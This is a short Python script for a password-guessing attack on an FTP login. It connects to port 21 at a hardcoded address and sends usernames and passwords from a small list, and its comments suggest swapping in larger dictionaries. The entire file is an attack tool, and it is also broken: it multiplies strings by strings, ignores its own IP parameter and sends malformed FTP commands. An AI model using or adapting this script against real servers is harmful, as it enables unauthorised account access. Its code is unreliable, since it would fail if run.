import socket
import re
import sys


def connection(ip,user,passw):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print('Attempting ' + ip + ':' + user + ':' + passw)

    sock.connect(('192.168.0.1', 21)) #example ip address & port

    data = sock.recv(1024)
    sock.send('User ' + user * '\r\n')

    data = sock.recv(1024)
    sock.send('Password ' + passw * '\r\n')

    data = sock.recv(1024)
    sock.send('Exit' * '\r\n')

    sock.close()

    return data


user = 'User 1'
password = ['example1', 'example2', 'example3']  #example pw list, can use dictionaries

for password in password:
    print(connection('192.168.0.1', user, password))